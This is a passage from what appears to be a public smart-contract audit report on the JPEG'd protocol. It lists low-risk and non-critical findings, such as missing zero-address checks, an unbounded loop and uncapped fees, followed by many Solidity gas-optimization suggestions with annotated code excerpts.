IERC20(_jpeg); //@audit low: should be address(0) checked just like in yVaultLPFarming.sol and StrategyPUSDConvex.sol\n\ncontracts/vaults/yVault/Controller.sol:\n  28:         jpeg = IERC20(_jpeg);  //@audit low: should be address(0) checked just like in yVaultLPFarming.sol and StrategyPUSDConvex.sol\n\ncontracts/vaults/yVault/yVault.sol:\n  53:         token = ERC20(_token);  //@audit low: should be address(0)\n```\n\n## \\[L-03] Unbounded loop on array can lead to DoS\n\nAs this array can grow quite large, the transaction's gas cost could exceed the block gas limit and make it impossible to call this function at all (see `@audit`):\n\n```solidity\nFile: LPFarming.sol\n141:     function add(uint256 _allocPoint, IERC20 _lpToken) external onlyOwner { \n...\n146:         poolInfo.push( //@audit low: a push exist but there's no pop in the solution.\n...\n154:     }\n...\n347:     function claimAll() external nonReentrant noContract(msg.sender) {\n348:         for (uint256 i = 0; i < poolInfo.length; i++) { //@audit low: poolInfo is unbounded\n349:             _updatePool(i);\n350:             _withdrawReward(i);\n351:         }\n...\n360:     }\n```\n\nConsider introducing a reasonable upper limit based on block gas limits and/or adding a `remove` method to remove elements in the array.\n\n## \\[L-04] Add a timelock and event to critical functions\n\nIt is a good practice to give time for users to react and adjust to critical changes. A timelock provides more guarantees and reduces the level of trust required, thus decreasing risk for users. It also indicates that the project is legitimate.\n\nConsider adding a timelock and event to:\n\n    vaults/yVault/strategies/StrategyPUSDConvex.sol:177:    function setPerformanceFee(Rate memory _performanceFee)\n    vaults/NFTVault.sol:290:    function setOrganizationFeeRate(Rate memory _organizationFeeRate)\n\n## \\[L-05] Fee in `StrategyPUSDConvex.setPerformanceFee()` should be upper-bounded\n\nSee `@audit`:\n\n```solidity\nFile: StrategyPUSDConvex.sol\n177:     function setPerformanceFee(Rate memory _performanceFee)\n178:         public\n179:         onlyRole(DEFAULT_ADMIN_ROLE)\n180:     {\n181:         require(\n182:             _performanceFee.denominator > 0 &&\n183:                 _performanceFee.denominator >= _performanceFee.numerator,\n184:             \"INVALID_RATE\"\n185:         );\n186:         performanceFee = _performanceFee; //@audit low: fee can be 100% (_performanceFee.denominator == _performanceFee.numerator)\n187:     }\n```\n\n## \\[L-06] Fee in `NFTVault.setOrganizationFeeRate()`should be upper-bounded\n\nSee `@audit`:\n\n```solidity\nFile: NFTVault.sol\n290:     function setOrganizationFeeRate(Rate memory _organizationFeeRate)  \n291:         external\n292:         onlyRole(DAO_ROLE)\n293:     {\n294:         _validateRate(_organizationFeeRate);\n295:         settings.organizationFeeRate = _organizationFeeRate; //@audit low: fee can be 100%\n296:     }\n...\n400:     function _validateRate(Rate memory rate) internal pure {\n401:         require(\n402:             rate.denominator > 0 && rate.denominator >= rate.numerator,  //@audit low: fee can be 100% (rate.denominator == rate.numerator)\n403:             \"invalid_rate\"\n404:         );\n405:     }\n```\n\n## \\[L-07] A magical number should be documented and explained: `1e36`. Use a constant instead\n\n```solidity\nfarming/LPFarming.sol:196:                1e36 *\nfarming/LPFarming.sol:207:            1e36;\nfarming/LPFarming.sol:307:            1e36 *\nfarming/LPFarming.sol:319:            1e36;\nfarming/yVaultLPFarming.sol:94:            1e36;\nfarming/yVaultLPFarming.sol:172:        newAccRewardsPerShare = accRewardPerShare + newRewards * 1e36 / totalStaked;\nfarming/yVaultLPFarming.sol:179:            (accRewardPerShare - userLastAccRewardPerShare[account])) / 1e36;\n```\n\nI suggest using `constant` variables as this would make the code more maintainable and readable while costing nothing gas-wise.\n\n## \\[N-01] Avoid floating pragmas: the version should be locked (preferably at >= `0.8.4`)\n\nThe pragma declared across the solution is `^0.8.0`. As the compiler introduces a several interesting upgrades in Solidity `0.8.4`, consider locking at this version or a more recent one.\n\n## \\[N-02] Related data should be grouped in a struct\n\nThe following `maps` should be grouped in structs.\n\nFrom:\n\n```solidity\ncontracts/farming/yVaultLPFarming.sol:\n  31:     mapping(address => uint256) public balanceOf; //@audit NC: related data 1\n  32:     mapping(address => uint256) private userLastAccRewardPerShare;//@audit NC: related data 2\n  33:     mapping(address => uint256) private userPendingRewards;//@audit NC: related data 3\n\ncontracts/vaults/yVault/Controller.sol:\n  20:     mapping(IERC20 => address) public vaults; //@audit NC: related data 1\n  21:     mapping(IERC20 => IStrategy) public strategies; //@audit NC: related data 2\n  22:     mapping(IERC20 => mapping(IStrategy => bool)) public approvedStrategies; //@audit NC: related data 3\n```\n\nTo\n\n```solidity\n    struct UserInfo {\n        uint256 balance;  \n        uint256 lastAccRewardPerShare;\n        uint256 pendingReward;\n    }\n    \n    mapping(address => UserInfo) public userInfo;\n```\n\nAnd\n\n```solidity\n    struct TokenInfo {\n        address vaults;  \n        IStrategy approvedStrategies;\n        mapping(IStrategy => bool) pendingReward;\n    }\n    \n    mapping(IERC20 => TokenInfo) public tokenInfo;\n```\n\nIt would be less error-prone, more readable, and it would be possible to delete all related fields with a simple `delete userInfo[address]`.\n\nHowever, the sponsor should notice that `pendingReward` won't be as easily deleted in `tokenInfo`, as it's a `mapping` field. It would still improve code quality nonetheless.\n\n## \\[N-03] Unused named returns\n\nUsing both named returns and a return statement isn't necessary. Removing one of those can improve code clarity (see `@audit`):\n\n```solidity\nFile: NFTEscrow.sol\n081:     function precompute(address _owner, uint256 _idx)\n082:         public\n083:         view\n084:         returns (bytes32 salt, address predictedAddress) //@audit NC: unused named returns\n085:     {\n...\n091:         salt = sha256(abi.encodePacked(_owner));\n...\n105:         predictedAddress = address(uint160(uint256(hash)));\n106:         return (salt, predictedAddress); //@audit NC: unused named returns\n107:     }\n```\n\n**[spaghettieth (JPEG'd) acknowledged](https://github.com/code-423n4/2022-04-jpegd-findings/issues/225)**\n\n**[LSDan (judge) commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/225#issuecomment-1115281813):**\n > I agree with the warden's security ratings for the issues described.\n\n\n\n***\n\n# Gas Optimizations\n\nFor this contest, 38 reports were submitted by wardens detailing gas optimizations. The [report highlighted below](https://github.com/code-423n4/2022-04-jpegd-findings/issues/121) by **Dravee** received the top score from the judge.\n\n*The following wardens also submitted reports: [IllIllI](https://github.com/code-423n4/2022-04-jpegd-findings/issues/207), [rfa](https://github.com/code-423n4/2022-04-jpegd-findings/issues/216), [0xkatana](https://github.com/code-423n4/2022-04-jpegd-findings/issues/195), [TerrierLover](https://github.com/code-423n4/2022-04-jpegd-findings/issues/45), [saian](https://github.com/code-423n4/2022-04-jpegd-findings/issues/152), [Tomio](https://github.com/code-423n4/2022-04-jpegd-findings/issues/187), [0xNazgul](https://github.com/code-423n4/2022-04-jpegd-findings/issues/127), [Funen](https://github.com/code-423n4/2022-04-jpegd-findings/issues/149), [robee](https://github.com/code-423n4/2022-04-jpegd-findings/issues/70), [Foundation](https://github.com/code-423n4/2022-04-jpegd-findings/issues/143), [WatchPug](https://github.com/code-423n4/2022-04-jpegd-findings/issues/169), [catchup](https://github.com/code-423n4/2022-04-jpegd-findings/issues/110), [0v3rf10w](https://github.com/code-423n4/2022-04-jpegd-findings/issues/32), [berndartmueller](https://github.com/code-423n4/2022-04-jpegd-findings/issues/111), [ellahi](https://github.com/code-423n4/2022-04-jpegd-findings/issues/185), [securerodd](https://github.com/code-423n4/2022-04-jpegd-findings/issues/102), [0x1f8b](https://github.com/code-423n4/2022-04-jpegd-findings/issues/91), [Cityscape](https://github.com/code-423n4/2022-04-jpegd-findings/issues/153), [FSchmoede](https://github.com/code-423n4/2022-04-jpegd-findings/issues/170), [hickuphh3](https://github.com/code-423n4/2022-04-jpegd-findings/issues/63), [ilan](https://github.com/code-423n4/2022-04-jpegd-findings/issues/210), [kenta](https://github.com/code-423n4/2022-04-jpegd-findings/issues/223), [slywaters](https://github.com/code-423n4/2022-04-jpegd-findings/issues/100), [rokinot](https://github.com/code-423n4/2022-04-jpegd-findings/issues/51), [0xDjango](https://github.com/code-423n4/2022-04-jpegd-findings/issues/218), [JMukesh](https://github.com/code-423n4/2022-04-jpegd-findings/issues/142), [nahnah](https://github.com/code-423n4/2022-04-jpegd-findings/issues/226), [PPrieditis](https://github.com/code-423n4/2022-04-jpegd-findings/issues/85), [sorrynotsorry](https://github.com/code-423n4/2022-04-jpegd-findings/issues/174), [delfin454000](https://github.com/code-423n4/2022-04-jpegd-findings/issues/180), [Hawkeye](https://github.com/code-423n4/2022-04-jpegd-findings/issues/191), [Meta0xNull](https://github.com/code-423n4/2022-04-jpegd-findings/issues/25), [dirk_y](https://github.com/code-423n4/2022-04-jpegd-findings/issues/43), [rayn](https://github.com/code-423n4/2022-04-jpegd-findings/issues/141), [Cr4ckM3](https://github.com/code-423n4/2022-04-jpegd-findings/issues/35), [Picodes](https://github.com/code-423n4/2022-04-jpegd-findings/issues/151), and [kebabsec](https://github.com/code-423n4/2022-04-jpegd-findings/issues/190).*\n\n## Table of Contents\n\nSee [original submission](https://github.com/code-423n4/2022-04-jpegd-findings/issues/121).\n\n## [G-01] `NFTEscrow._executeTransfer()`: Cheap Contract Deployment Through Clones\n\nSee `@audit` tag:\n\n```solidity\n67:     function _executeTransfer(address _owner, uint256 _idx) internal {\n68:         (bytes32 salt, ) = precompute(_owner, _idx);\n69:         new FlashEscrow{salt: salt}( //@audit gas: deployment can cost less through clones \n70:             nftAddress,\n71:             _encodeFlashEscrowPayload(_idx)\n72:         );\n73:     }\n```\n\nThere's a way to save a significant amount of gas on deployment using Clones: <https://www.youtube.com/watch?v=3Mw-pMmJ7TA> .\n\nThis is a solution that was adopted, as an example, by Porter Finance. They realized that deploying using clones was 10x cheaper:\n\n*   <https://github.com/porter-finance/v1-core/issues/15#issuecomment-1035639516>\n*   <https://github.com/porter-finance/v1-core/pull/34>\n\nI suggest applying a similar pattern.\n\n## [G-02] `LPFarming.newEpoch()`: L128 and L133 should be unchecked due to parent if/else condition\n\nSolidity version 0.8+ comes with implicit overflow and underflow checks on unsigned integers. When an overflow or an underflow isn't possible (as an example, when a comparison is made before the arithmetic operation), some gas can be saved by using an `unchecked` block: <https://docs.soliditylang.org/en/v0.8.10/control-structures.html#checked-or-unchecked-arithmetic>\n\nI suggest wrapping with an `unchecked` block here (see `@audit` tag):\n\n```solidity\n107:     function newEpoch(\n...\n111:     ) external onlyOwner {\n127:         if (remainingRewards > newRewards) {\n128:             jpeg.safeTransfer(msg.sender, remainingRewards - newRewards);  //@audit gas: should be unchecked (can't underflow due to L127)\n129:         } else if (remainingRewards < newRewards) {\n130:             jpeg.safeTransferFrom(\n131:                 msg.sender,\n132:                 address(this),\n133:                 newRewards - remainingRewards  //@audit gas: should be unchecked (can't underflow due to L129)\n134:             );\n135:         }\n136:     }\n```\n\n## [G-03] `LPFarming.withdraw()`: L248 should be unchecked due to L243\n\nSee `@audit` tag:\n\n```solidity\n235:     function withdraw(uint256 _pid, uint256 _amount)\n236:         external\n237:         noContract(msg.sender)\n238:     {\n239:         require(_amount > 0, \"invalid_amount\");\n240: \n241:         PoolInfo storage pool = poolInfo[_pid];\n242:         UserInfo storage user = userInfo[_pid][msg.sender];\n243:         require(user.amount >= _amount, \"insufficient_amount\");\n244: \n245:         _updatePool(_pid);\n246:         _withdrawReward(_pid);\n247: \n248:         user.amount -= _amount;  //@audit gas: should be unchecked (can't underflow due to L243)\n```\n\n## [G-04] `LPFarming._withdrawReward()`: `poolInfo[_pid].accRewardPerShare` should get cached\n\nThe code can be optimized by minimising the number of SLOADs. SLOADs are expensive (100 gas) compared to MLOADs/MSTOREs (3 gas). Here, the storage value should get cached in memory (see the `@audit` tags for further details):\n\n```solidity\n315:     function _withdrawReward(uint256 _pid) internal returns (uint256) {\n316:         UserInfo storage user = userInfo[_pid][msg.sender];\n317:         uint256 pending = (user.amount *\n318:             (poolInfo[_pid].accRewardPerShare - user.lastAccRewardPerShare)) / //@audit gas: SLOAD 1 poolInfo[_pid].accRewardPerShare\n319:             1e36;\n320:         if (pending > 0) {\n321:             userRewards[msg.sender] += pending;\n322:         }\n323: \n324:         user.lastAccRewardPerShare = poolInfo[_pid].accRewardPerShare; //@audit gas: SLOAD 2 poolInfo[_pid].accRewardPerShare\n325: \n326:         return pending;\n327:     }\n```\n\n## [G-05] `yVaultLPFarming.withdraw()`: L124 should be unchecked due to L119\n\nSee `@audit` tag:\n\n```solidity\n117:     function withdraw(uint256 _amount) external noContract(msg.sender) {\n118:         require(_amount > 0, \"invalid_amount\");\n119:         require(balanceOf[msg.sender] >= _amount, \"insufficient_amount\");\n120: \n121:         _update();\n122:         _withdrawReward(msg.sender);\n123: \n124:         balanceOf[msg.sender] -= _amount;  //@audit gas: should be unchecked (can't underflow due to L119)\n```\n\n## [G-06] `yVaultLPFarming._withdrawReward()`: `accRewardPerShare` should get cached\n\nSee `@audit` tags:\n\n```solidity\n177:     function _withdrawReward(address account) internal returns (uint256) {\n178:         uint256 pending = (balanceOf[account] *\n179:             (accRewardPerShare - userLastAccRewardPerShare[account])) / 1e36; //@audit gas: SLOAD 1 accRewardPerShare\n180: \n181:         if (pending > 0) userPendingRewards[account] += pending;\n182: \n183:         userLastAccRewardPerShare[account] = accRewardPerShare; //@audit gas: SLOAD 2 accRewardPerShare\n184: \n185:         return pending;\n186:     }\n```\n\n## [G-07] `JPEGLock.unlock()`: use `storage` instead of copying struct in memory L69\n\nSee `@audit` tag:\n\n```solidity\n68:     function unlock(uint256 _nftIndex) external nonReentrant {\n69:         LockPosition memory position = positions[_nftIndex]; //@audit gas: costing 3 SLOADs while only lockAmount is needed twice. Replace \"memory\" with \"storage\" and cache only position.lockAmount \n70:         require(position.owner == msg.sender, \"unauthorized\");\n71:         require(position.unlockAt <= block.timestamp, \"locked\");\n72: \n73:         delete positions[_nftIndex];\n74: \n75:         jpeg.safeTransfer(msg.sender, position.lockAmount);\n76: \n77:         emit Unlock(msg.sender, _nftIndex, position.lockAmount);\n78:     }\n```\n\nHere, a copy in memory is costing 3 SLOADs and 3 MSTORES. The, 2 variables are only read once through MLOAD (`position.owner` and `position.unlockAt`) and one is read twice (`position.lockAmount`).\nI suggest replacing the `memory` keyword with `storage` at L69 and only copying `position.lockAmount` in memory.\n\n## [G-08] `FungibleAssetVaultForDAO._collateralPriceUsd()`: `oracle` should get cached\n\nSee `@audit` tags:\n\n```solidity\n104:     function _collateralPriceUsd() internal view returns (uint256) {\n105:         int256 answer = oracle.latestAnswer();  //@audit gas: SLOAD 1 oracle\n106:         uint8 decimals = oracle.decimals();  //@audit gas: SLOAD 2 oracle\n107: \n```\n\n## [G-09] `FungibleAssetVaultForDAO._collateralPriceUsd()`: return statement should be unchecked\n\nSee `@audit` tag:\n\n```solidity\n104:     function _collateralPriceUsd() internal view returns (uint256) {\n...\n111:         return //@audit gas: whole return statement should be unchecked (obviously can't underflow/overflow here)\n112:             decimals > 18\n113:                 ? uint256(answer) / 10**(decimals - 18)  \n114:                 : uint256(answer) * 10**(18 - decimals);  \n115:     }\n```\n\nDue to the ternary condition and the fact that `int256 answer = oracle.latestAnswer();`, the return statement can't underflow and should be unchecked.\n\n## [G-10] `FungibleAssetVaultForDAO.deposit()`: `collateralAsset` should get cached\n\nSee `@audit` tags:\n\n```solidity\n141:     function deposit(uint256 amount) external payable onlyRole(WHITELISTED_ROLE) {\n142:         require(amount > 0, \"invalid_amount\");\n143: \n144:         if (collateralAsset == ETH) {  //@audit gas: SLOAD 1 collateralAsset\n145:             require(msg.value == amount, \"invalid_msg_value\");\n146:         } else {\n147:             require(msg.value == 0, \"non_zero_eth_value\");\n148:             IERC20Upgradeable(collateralAsset).safeTransferFrom(  //@audit gas: SLOAD 2 collateralAsset\n149:                 msg.sender,\n150:                 address(this),\n151:                 amount\n152:             );\n153:         }\n```\n\n## [G-11] `FungibleAssetVaultForDAO.repay)`: L184 should be unchecked due to L182\n\nSee `@audit` tag:\n\n```solidity\n179:     function repay(uint256 amount) external onlyRole(WHITELISTED_ROLE) nonReentrant {\n180:         require(amount > 0, \"invalid_amount\");\n181: \n182:         amount = amount > debtAmount ? debtAmount : amount;\n183: \n184:         debtAmount -= amount; //@audit gas: should be unchecked (can't underflow due to L182)\n```\n\n## [G-12] `FungibleAssetVaultForDAO.withdraw()`: L196 should be unchecked due to L194\n\nSee `@audit` tag:\n\n```solidity\n193:     function withdraw(uint256 amount) external onlyRole(WHITELISTED_ROLE) nonReentrant {\n194:         require(amount > 0 && amount <= collateralAmount, \"invalid_amount\");\n195: \n196:         uint256 creditLimit = getCreditLimit(collateralAmount - amount); //@audit gas: should be unchecked (can't underflow due to L194)\n```\n\n## [G-13] `FungibleAssetVaultForDAO.withdraw()`: `collateralAmount` should get cached\n\nSee `@audit` tags:\n\n```solidity\n193:     function withdraw(uint256 amount) external onlyRole(WHITELISTED_ROLE) nonReentrant {\n194:         require(amount > 0 && amount <= collateralAmount, \"invalid_amount\");  //@audit gas: SLOAD 1 collateralAmount\n195: \n196:         uint256 creditLimit = getCreditLimit(collateralAmount - amount); //@audit gas: SLOAD 2 collateralAmount\n197:         require(creditLimit >= debtAmount, \"insufficient_credit\");\n198: \n199:         collateralAmount -= amount; //@audit gas: SLOAD 3 collateralAmount (could've used the a cached value for calculation)\n```\n\n## [G-14] `NFTVault._normalizeAggregatorAnswer()`: return statement should be unchecked\n\nSee `@audit` tag:\n\n```solidity\n454:     function _normalizeAggregatorAnswer(IAggregatorV3Interface aggregator)\n455:         internal\n456:         view\n457:         returns (uint256)\n458:     {\n...\n464:         return //@audit gas: whole return statement should be unchecked (obviously can't underflow/overflow)\n465:             decimals > 18\n466:                 ? uint256(answer) / 10**(decimals - 18)\n467:                 : uint256(answer) * 10**(18 - decimals);\n468:     }\n```\n\n## [G-15] `NFTVault._calculateAdditionalInterest()`: `totalDebtAmount` should get cached\n\nSee `@audit` tags:\n\n```solidity\n578:     function _calculateAdditionalInterest() internal view returns (uint256) {\n...\n585:         if (totalDebtAmount == 0) {  //@audit gas: SLOAD 1 totalDebtAmount\n586:             return 0;\n587:         }\n588: \n589:         // Accrue interest\n590:         uint256 interestPerYear = (totalDebtAmount *  //@audit gas: SLOAD 2 totalDebtAmount\n```\n\n## [G-16] `NFTVault.sol`: `struct PositionPreview` can be tightly packed to save 1 storage slot\n\nFrom (see `@audit` tags):\n\n```solidity\n610:     struct PositionPreview { // @audit gas: can be tightly packed by moving borrowType and liquidatable at the end\n611:         address owner;\n612:         uint256 nftIndex;\n613:         bytes32 nftType;\n614:         uint256 nftValueUSD;\n615:         VaultSettings vaultSettings;\n616:         uint256 creditLimit;\n617:         uint256 debtPrincipal;\n618:         uint256 debtInterest; // @audit gas: 32 bytes\n619:         BorrowType borrowType; // @audit gas: 1 byte (this enum is equivalent to uint8 as it has less than 256 options)\n620:         bool liquidatable; // @audit gas: 1 byte\n621:         uint256 liquidatedAt; // @audit gas: 32 bytes\n622:         address liquidator; // @audit gas: 20 bytes\n623:     }\n```\n\nTo:\n\n```solidity\n    struct PositionPreview {\n        address owner;\n        uint256 nftIndex;\n        bytes32 nftType;\n        uint256 nftValueUSD;\n        VaultSettings vaultSettings;\n        uint256 creditLimit;\n        uint256 debtPrincipal;\n        uint256 debtInterest; // @audit gas: 32 bytes\n        uint256 liquidatedAt; // @audit gas: 32 bytes\n        BorrowType borrowType; // @audit gas: 1 byte (this enum is equivalent to uint8 as it has less than 256 options)\n        bool liquidatable; // @audit gas: 1 byte\n        address liquidator; // @audit gas: 20 bytes\n    }\n```\n\n## [G-17] `NFTVault.showPosition()`: L659 should be unchecked due to L649\n\nSee `@audit` tag:\n\n```solidity\nFile: NFTVault.sol\n628:     function showPosition(uint256 _nftIndex)\n...\n649:         if (debtPrincipal > debtAmount) debtAmount = debtPrincipal;\n...\n659:             debtInterest: debtAmount - debtPrincipal, //@audit gas: should be unchecked (can't underflow due to L649)\n```\n\n## [G-18] `NFTVault.showPosition()`: `positions[_nftIndex].liquidatedAt` should get cached\n\nSee `@audit` tags:\n\n```solidity\nFile: NFTVault.sol\n628:     function showPosition(uint256 _nftIndex)\n...\n661:             liquidatable: positions[_nftIndex].liquidatedAt == 0 &&  //@audit gas: SLOAD 1 positions[_nftIndex].liquidatedAt\n662:                 debtAmount >= _getLiquidationLimit(_nftIndex),\n663:             liquidatedAt: positions[_nftIndex].liquidatedAt,  //@audit gas: SLOAD 2 positions[_nftIndex].liquidatedAt\n```\n\n## [G-19] `NFTVault.showPosition()`: Help the optimizer by saving a storage variable's reference instead of repeatedly fetching it (`positions[_nftIndex]`)\n\nTo help the optimizer, declare a `storage` type variable and use it instead of repeatedly fetching the reference in a map or an array.\n\nThe effect can be quite significant.\n\nHere, instead of repeatedly calling `positions[_nftIndex]`, save its reference like this: `Position storage _position = positions[_nftIndex]` and use it.\n\nImpacted lines (see `@audit` tags):\n\n```solidity\n  636:         uint256 debtPrincipal = positions[_nftIndex].debtPrincipal; //@audit gas: use the suggested storage variable \"Position storage _position\"\n  637:         uint256 debtAmount = positions[_nftIndex].liquidatedAt > 0 //@audit gas: use the suggested storage variable \"Position storage _position\"\n  638:             ? positions[_nftIndex].debtAmountForRepurchase //@audit gas: use the suggested storage variable \"Position storage _position\"\n  641:                 positions[_nftIndex].debtPortion, //@audit gas: use the suggested storage variable \"Position storage _position\"\n  660:             borrowType: positions[_nftIndex].borrowType, //@audit gas: use the suggested storage variable \"Position storage _position\"\n  661:             liquidatable: positions[_nftIndex].liquidatedAt == 0 && //@audit gas: use the suggested storage variable \"Position storage _position\"\n  663:             liquidatedAt: positions[_nftIndex].liquidatedAt, //@audit gas: use the suggested storage variable \"Position storage _position\"\n  664:             liquidator: positions[_nftIndex].liquidator //@audit gas: use the suggested storage variable \"Position storage _position\"\n```\n\nThis practice already exists in the solution, as seen in `NFTVault.borrow()`:\n\n```solidity\n675:     function borrow(\n...\n697:         Position storage position = positions[_nftIndex];\n```\n\n## [G-20] `NFTVault.borrow()`: `totalDebtPortion` should get cached\n\nSee `@audit` tags:\n\n```solidity\n675:     function borrow(\n...\n735:         if (totalDebtPortion == 0) {  //@audit gas: SLOAD 1 totalDebtPortion\n...\n738:         } else {\n739:             uint256 plusPortion = (totalDebtPortion * _amount) / //@audit gas: SLOAD 2 totalDebtPortion\n740:                 totalDebtAmount;\n741:             totalDebtPortion += plusPortion; //@audit gas: SLOAD 3 totalDebtPortion (could've used cached value for calculation)\n```\n\n## [G-21] `NFTVault.repay()`: L781 should be unchecked due to ternary operator\n\nSee `@audit` tag:\n\n```solidity\n756:     function repay(uint256 _nftIndex, uint256 _amount)\n...\n780:         uint256 paidPrincipal = _amount > debtInterest\n781:             ? _amount - debtInterest //@audit gas: should be unchecked (obviously)\n782:             : 0;\n```\n\n## [G-22] `NFTVault.repay()`: `totalDebtPortion` and `totalDebtAmount` should get cached\n\nSee `@audit` tags:\n\n```solidity\n756:     function repay(uint256 _nftIndex, uint256 _amount)\n...\n784:         uint256 minusPortion = paidPrincipal == debtPrincipal\n785:             ? position.debtPortion\n786:             : (totalDebtPortion * _amount) / totalDebtAmount; //@audit gas: SLOADs 1 totalDebtPortion & totalDebtAmount\n787: \n788:         totalDebtPortion -= minusPortion; //@audit gas: SLOAD 2 totalDebtPortion (could've used cached value for calculation)\n...\n791:         totalDebtAmount -= _amount; //@audit gas: SLOAD 2 totalDebtAmount (could've used cached value for calculation)\n```\n\n## [G-23] `Controller.setStrategy()`: boolean comparison L87\n\nComparing to a constant (`true` or `false`) is a bit more expensive than directly checking the returned boolean value.\nI suggest using `if(directValue)` instead of `if(directValue == true)` and `if(!directValue)` instead of `if(directValue == false)` here (see `@audit` tag):\n\n```solidity\n82:     function setStrategy(IERC20 _token, IStrategy _strategy)\n83:         external\n84:         onlyRole(STRATEGIST_ROLE)\n85:     {\n86:         require(\n87:             approvedStrategies[_token][_strategy] == true, //@audit gas: instead of comparing to a constant, just use \"approvedStrategies[_token][_strategy]\"\n```\n\n## [G-24] `StrategyPUSDConvex.balanceOfJPEG()`: `jpeg` should get cached\n\nSee `@audit` tags:\n\n```solidity\n226:     function balanceOfJPEG() external view returns (uint256) {\n227:         uint256 availableBalance = jpeg.balanceOf(address(this)); //@audit gas: SLOAD 1 jpeg\n...\n231:         for (uint256 i = 0; i < length; i++) {\n...\n233:             if (address(jpeg) == extraReward.rewardToken()) { //@audit gas: SLOADs in Loop for jpeg. Cache it at L227\n```\n\n## [G-25] `StrategyPUSDConvex.balanceOfJPEG()`: use a `return` statement instead of `break`\n\nSee `@audit` tag:\n\n```solidity\n226:     function balanceOfJPEG() external view returns (uint256) {\n...\n231:         for (uint256 i = 0; i < length; i++) {\n...\n233:             if (address(jpeg) == extraReward.rewardToken()) {\n234:                 availableBalance += extraReward.earned();\n235:                 //we found jpeg, no need to continue the loop\n236:                 break; //@audit gas: instead of adding to availableBalance & breaking, just return here \"availableBalance + extraReward.earned()\"\n237:             }\n238:         }\n239: \n240:         return availableBalance;\n241:     }\n```\n\nHere, instead of making a memory operation with `availableBalance += extraReward.earned();` and then using `break;` before returning the memory variable `availableBalance`, it would've been more optimized to just return `availableBalance + extraReward.earned()`:\n\n```solidity\n    function balanceOfJPEG() external view returns (uint256) {\n...\n        for (uint256 i = 0; i < length; i++) {\n...\n            if (address(jpeg) == extraReward.rewardToken()) {\n              return availableBalance + extraReward.earned();\n            }\n        }\n    }\n```\n\n## [G-26] `StrategyPUSDConvex.withdraw()`: L281 should be unchecked due to L279\n\nSee `@audit` tag:\n\n```solidity\n273:     function withdraw(uint256 _amount) external onlyController {\n...\n279:         if (balance < _amount)\n280:             convexConfig.baseRewardPool.withdrawAndUnwrap(\n281:                 _amount - balance, //@audit gas: should be unchecked (can't underflow due to L279)\n282:                 false\n283:             );\n```\n\n## [G-27] `StrategyPUSDConvex.harvest()`: L362 should be unchecked due to L359-L360 and how performanceFee is set L183\n\nSee `@audit` tags:\n\n```solidity\n177:     function setPerformanceFee(Rate memory _performanceFee)\n...\n181:         require(\n182:             _performanceFee.denominator > 0 &&\n183:                 _performanceFee.denominator >= _performanceFee.numerator, //@audit gas: can uncheck L362 thanks to this\n184:             \"INVALID_RATE\"\n185:         );\n...\n311:     function harvest(uint256 minOutCurve) external onlyRole(STRATEGIST_ROLE) {\n...\n359:         uint256 fee = (usdcBalance * performanceFee.numerator) /\n360:             performanceFee.denominator;\n361:         usdc.safeTransfer(strategy.controller.feeAddress(), fee);\n362:         usdcBalance -= fee; //@audit gas: should be unchecked (can't underflow due to L359-L360 & how performanceFee is set L183)\n```\n\n## [G-28] `yVault.earn()`: `token` and `controller` should get cached\n\nSee `@audit` tags:\n\n```solidity\n129:     function earn() external {\n130:         uint256 _bal = available();\n131:         token.safeTransfer(address(controller), _bal); //@audit gas: SLOADs 1 token & controller\n132:         controller.earn(address(token), _bal); //@audit gas: SLOADs 2 token & controller\n133:     }\n```\n\n## [G-29] `yVault.withdraw()`: L178 should be unchecked due to L177\n\nSee `@audit` tag:\n\n```solidity\n166:     function withdraw(uint256 _shares) public noContract(msg.sender) {\n...\n177:         if (vaultBalance < backingTokens) {\n178:             uint256 toWithdraw = backingTokens - vaultBalance; //@audit gas: should be unchecked (can't underflow due to L177)\n```\n\n## [G-30] `yVault.withdraw()`: `token` should get cached\n\nSee `@audit` tags:\n\n```solidity\n166:     function withdraw(uint256 _shares) public noContract(msg.sender) {\n...\n176:         uint256 vaultBalance = token.balanceOf(address(this)); //@audit gas: SLOAD 1 token\n177:         if (vaultBalance < backingTokens) {\n178:             uint256 toWithdraw = backingTokens - vaultBalance;\n179:             controller.withdraw(address(token), toWithdraw);  //@audit gas: SLOAD 2 token\n180:         }\n181: \n182:         token.safeTransfer(msg.sender, backingTokens);  //@audit gas: SLOAD 3 token\n```\n\n## [G-31] `yVault.withdrawJPEG()`: `farm` should get cached\n\nSee `@audit` tags:\n\n```solidity\n187:     function withdrawJPEG() external {\n188:         require(farm != address(0), \"NO_FARM\");  //@audit gas: SLOAD 1 farm\n189:         controller.withdrawJPEG(address(token), farm);  //@audit gas: SLOAD 2 farm\n190:     }\n```\n\n## [G-32] Upgrade pragma to at least 0.8.4\n\nAcross the whole solution, the declared pragma is `^0.8.0`.\n\nUsing newer compiler versions and the optimizer give gas optimizations. Also, additional safety checks are available for free.\n\nThe advantages here are:\n\n*   **Low level inliner** (>= 0.8.2): Cheaper runtime gas (especially relevant when the contract has small functions).\n*   **Optimizer improvements in packed structs** (>= 0.8.3)\n*   **Custom errors** (>= 0.8.4): cheaper deployment cost and runtime cost. *Note*: the runtime cost is only relevant when the revert condition is met. In short, replace revert strings by custom errors.\n\nConsider upgrading pragma to at least 0.8.4:\n\n## [G-33] No need to explicitly initialize variables with default values\n\nIf a variable is not set/initialized, it is assumed to have the default value (`0` for `uint`, `false` for `bool`, `address(0)` for address...). Explicitly initializing it with its default value is an anti-pattern and wastes gas.\n\nAs an example: `for (uint256 i = 0; i < numIterations; ++i) {` should be replaced with `for (uint256 i; i < numIterations; ++i) {`\n\nInstances include:\n\n```solidity\nfarming/LPFarming.sol:281:        for (uint256 pid = 0; pid < length; ++pid) {\nfarming/LPFarming.sol:348:        for (uint256 i = 0; i < poolInfo.length; i++) {\nvaults/yVault/strategies/StrategyPUSDConvex.sol:145:        for (uint256 i = 0; i < _strategyConfig.rewardTokens.length; i++) {\nvaults/yVault/strategies/StrategyPUSDConvex.sol:231:        for (uint256 i = 0; i < length; i++) {\nvaults/yVault/strategies/StrategyPUSDConvex.sol:319:            for (uint256 i = 0; i < rewardTokens.length; i++) {\nvaults/FungibleAssetVaultForDAO.sol:45:    address internal constant ETH = address(0);\nvaults/NFTVault.sol:181:        for (uint256 i = 0; i < _typeInitializers.length; i++) {\nvaults/NFTVault.sol:184:            for (uint256 j = 0; j < initializer.nfts.length; j++) {\n```\n\nI suggest removing explicit initializations for default values.\n\n## [G-34] `> 0` is less efficient than `!= 0` for unsigned integers (with proof)\n\n`!= 0` costs less gas compared to `> 0` for unsigned integers in `require` statements with the 